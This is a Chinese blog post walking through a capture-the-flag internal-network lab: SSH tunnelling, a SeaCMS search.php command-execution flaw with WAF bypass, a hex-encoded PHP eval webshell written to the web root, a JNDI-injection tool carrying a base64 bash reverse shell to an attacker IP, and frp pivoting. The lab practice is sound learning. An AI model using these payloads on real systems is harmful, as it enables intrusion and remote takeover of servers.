---
title: CTF菜鸟内网靶场学习笔记
url: https://mp.weixin.qq.com/s/HNZaRoAmA0bFjIZ_OI1Obw
source: Doonsec's feed
date: 2026-09-26
fetch_date: 2026-09-27T07:20:10.515603
---

# CTF菜鸟内网靶场学习笔记

# CTF菜鸟内网靶场学习笔记

原创

studying-egg
studying-egg

正在思考ing

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

## 前言

一个很棒的内网靶场，奈何自已太菜了，中间步骤浪费太多时间，最终没能够完整体验这个靶场。还得慢慢沉淀

## 提供的机器

一台Win11(跳板机)，一台kali攻击机(与DMZ处于同一网段)

### 网络拓扑

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/g673ce4c7rlRFuBibe5uRObmj5rfeZWAPPLmSN551GzstQpqJHhcXSNWuoKNGxfqUg6G29yiaPpXBYLd3sPrWG7ibqLuVEtPGcyibj4KyhyOpS4/640?wx_fmt=webp&from=appmsg)

## 渗透思路

通过kali渗透机对门户入口进行探测

![](https://mmbiz.qpic.cn/mmbiz_jpg/g673ce4c7rnwzITHzAGWExeXZrhzlreH2eW5LEj3jCBUwpC4fNicVNtWLnbup7jWibdEQ0VicEYuwyWpI6fL12o744alxY1y5O26ibH5YLRKqFE/640?wx_fmt=webp&from=appmsg)

这里做了端口映射，28080后是海洋CMS，这里因为我的Windows门户网站不在同一网段，所以这里在kali攻击机上搭建SSH隧道进行端口转发

```
ssh -L 13392:101.168.23.5:28080 root@172.23.208.21 -N
```

访问`127.0.0.1:13392`，找到海洋CMS首页

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/g673ce4c7rkJVEiaYeGg0cyOw93MOP4Cs1DGibGq4B1cHqxfziajREKAtfSOud1XibfmA5qg224wqebictLRn7U90npbsiaialbOSK4yjfSiabnfrBA/640?wx_fmt=webp&from=appmsg)

访问`/data/admin/ver.txt`这个接口查询版本号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/g673ce4c7rmlgOP6ymfUTRTqxCYAV4Hia4yITK7OTiaew99s9KdPiaK5icwJiax5CRonE5cp4hYCv2nIJibFtlMw9aibwciaIWaCENWjDic20uPFaFcE/640?wx_fmt=webp&from=appmsg)

通过历史CVE查询，对`search.php`这个php文件存在命令执行漏洞

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/g673ce4c7rkGx1oeLyeWxe1UEVVIuzygn22VbFSMlmlNZaWnwJa515PMrSaibgEggSB1iaRxFv7gYb9YxEiaJZNGmM9R2MpV8OqaBAtoiaV4F3A/640?wx_fmt=webp&from=appmsg)

返回当前用户:`www-data`

这里存在WAF，很多的关键词都被禁了(对php的关键词绕过练的太少了，浪费了很多时间😭)

查看当前目录`stem("'l''s'")`

![](https://mmbiz.qpic.cn/mmbiz_jpg/g673ce4c7rns0MMJicWEtCpGM9cufA2VFIwPOJiaQMKbc1jYkatzD3AialR5pr32RfZKPRQbaroa6sEphJf3Lp4BKRFzgUyfnHvqlbTIMq4yic8/640?wx_fmt=webp&from=appmsg)

查看当前目录下的`flag.php`文件，`tac *`

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/g673ce4c7rkBl75DypeiciaMibWWpj2xpibX3VPjEG0co9UVo2tMF6evvk3d4pfy03Wv0GuvdjcKs2tC7fxKuKTlGgDxs887oKRaEzicOVVuH0F0/640?wx_fmt=webp&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/g673ce4c7rnoFwticEx063hxdfvAtAiasMrgn65syzCkq5ghVluic5eORS7a8khJIusEr2MrlR2BPqpjYJPwnJeqAbBiaHDWCGYL6ofVr8XOOdg/640?wx_fmt=webp&from=appmsg)

这里写入一句话木马，通过16进制编码绕过WAF

```
stem("echo '\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x63\x5d\x29\x3b\x3f\x3e' > /var/www/html/xx2.php");
```

通过蚁剑连接，成功上线

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/g673ce4c7rmflIImfJjF6IKicGhK7SjtKIKcys42V1e56BLOX7XRAVNZ4rqxG1AhFfzlI7g3L9c89XQSFbLcwAbvjGOp13CDOVgfECcWLLHc/640?wx_fmt=webp&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_jpg/g673ce4c7rkibgDC684QTwlR0x0z4ibJrhy3DbPRVo1AZB8PYOfSf5JF64ACiaXMEI94Qbhat9fLicaO8YW1JHeiaMyIyQsQsLLtIZGWCuaqDe7w/640?wx_fmt=webp&from=appmsg)

但这个机器好像是不能够横向移动到办公区，这里尝试其它机器 查看8080端口这台机器，同样通过SSH隧道去访问

![](https://mmbiz.qpic.cn/mmbiz_jpg/g673ce4c7rkj76eYUHyERoaic69xAGfEHIUmcH3ECV30WUlguz9XIMCyEVcrb5G6URBo28xVtLmOicT6E2pkFeDBUqqqRYWfYMtT1duNFnATI/640?wx_fmt=webp&from=appmsg)

随机一个账密尝试

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/g673ce4c7rk5ISKiaYs0PAL3K8GJDlicOibooh88iaBOhkcib8ibB9fr7vIRxbqgEKu1TnicsG3nhvbxYN7hylOGKA8kLzIGjMg68444SzMyqQzCAc/640?wx_fmt=webp&from=appmsg)

这里说会在日志中记录信息，这里猜测是否可能存在`JNDI注入`漏洞

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMTY4LjIzLjUzLzc3ODggMD4mMQ==}|{base64,-d}|{bash,-i}" -A 101.168.23.53
```

> PS:这里做的时候犯🍬了，把payload的IP一直设置是kali机与Win主机同一网段的IP，没有注意到kali机上其实有两张网卡，卡了整整一下午😭😭😭

然后寻找注入点，这里抓包猜测注入点可能就是在`username`和`password`上

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/g673ce4c7rmKS8cE2bfy0ia3eQ9qoVA1Ejr2FMDs01NVqZCeq75k1cxWJ7RXlgD3Q4CuIk2UovGwpyLQ41KbsaacWoogSTnolVNiarq3krNsc/640?wx_fmt=webp&from=appmsg)

反弹shell成功

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/g673ce4c7rmqibn78O4tCKicEOYg5UINkITOVGhvh3UQov1zOT4zjlG8y5IwOViaHjzpuQjOhyws9pFlHaiaHfya7qEnSaKQAzASzsibGUFggasI/640?wx_fmt=webp&from=appmsg)

这台机器就可以成功进入办公区 这里思路是将控制的业务网站服务器作为代理服务器，进入办公区 因为业务网站只拿到了反弹shell，不方便传入文件，这里将kali攻击机作为跳板机，通过python起http服务，通过curl指令把攻击机上的`frpc`下载下来

![](https://mmbiz.qpic.cn/mmbiz_jpg/g673ce4c7rk5NmG1VRqxLCgWtHbRicQv7KmTFiaBLBRjQeziakmtrFTicqmCl2ia7m4OIcoVvia4hFZ3OFNCF9Xicia9CAf9FH5LOZh9QMAq0waX0sI/640?wx_fmt=webp&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/g673ce4c7rnQ3kibAdfUfMtbicmsphjXf8lFqFZaibE7hZn0jNibkFlo2hXWvJ5InR5EC9AH9ICueprvrVFOd1EFiaUUnaO3PnPJI6bqibick96GHA/640?wx_fmt=webp&from=appmsg)

同时在kali攻击机上启动`frps`

![](https://mmbiz.qpic.cn/mmbiz_jpg/g673ce4c7rlUOOVQ05XLeFPEl8ia6zODYCU66HwiafCDGvCEyrvxMib3WibJqWtQEmhLyjYXz1JANU4lJWTQ7o1I5yAX1E04bhlFNhCv2iaBwzxE/640?wx_fmt=webp&from=appmsg)

通过`Proxifier`代理成功访问到办公区

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/g673ce4c7rn1Fib4rSe5oOmGTU2ELFG5ibqZkW9E3fzI8yWUvMnMw7LSm6ZZnH3lGRgCVJYARSGibn1A9XrDVXh4eSiaibcVh0boXIVvhBTZ7mQA/640?wx_fmt=webp&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_jpg/g673ce4c7rmMLEdfacECFfeU7zE2SaQ6kyelrjzKg9G28QPZEzo3ibDtb86sV8AbKwoGReafghRhYtia3gicgY3vbhZGibGpEjM9GDv8oHlicUAM/640?wx_fmt=webp&from=appmsg)

访问`http://10.11.36.99/`

![](https://mmbiz.qpic.cn/mmbiz_jpg/g673ce4c7rluMmfk8qxJoL89nUUVfERyGuTQ5blGdVl4wzffVBMGCpXeOIUv8OS7pHdialGU3MpMfpzKkbY6Y3jPOkwpyibfcKiafeqHuN70x4/640?wx_fmt=webp&from=appmsg)

## 结语

觉得靶场做的是真的非常棒，多层代理真的还是很考验基本功的。思路自我感觉还是走了很多的弯路，还请各位师傅批评指正

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/UKpIYGnLasKiaktndBsK1icZCdPnhD70PLW8D6ENptOZOHNIAIibQMqKTqqlcBxISjgOkp9Z28up1Puv1aXxObxeA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过